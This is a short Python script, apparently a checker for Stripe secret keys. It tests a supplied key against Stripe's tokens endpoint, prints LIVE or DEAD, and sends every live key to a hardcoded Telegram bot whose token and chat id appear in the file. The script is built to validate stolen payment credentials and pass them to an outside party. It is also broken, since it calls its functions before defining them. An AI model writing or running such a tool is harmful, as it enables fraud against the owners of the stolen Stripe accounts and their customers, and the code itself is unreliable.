import requests, random, string, time, os

token = "5130111289:AAFSrYRXL9X_hlLd_t52tejadBMsaU6xgIw"
chatid = 5178256472

asking = input("Long Sk or Short??")
if asking == "L":
  skkey = input("Gib")
  while True:
    long_key(skkey)
elif asking == "S":
  skkey = input("Gib")
  while True:
    short_key(skkey)
  

def long_key(skkey):
  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, auth=(skkey, ""))
  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
    print(f"DEAD > {skkey}")
  else:
    print(f"LIVE > {skkey}")
    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
    
def short_key(skkey):
  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, auth=(skkey, ""))
  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
    print(f"DEAD > {skkey}")
  else:
    print(f"LIVE > {skkey}")
    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
    

    
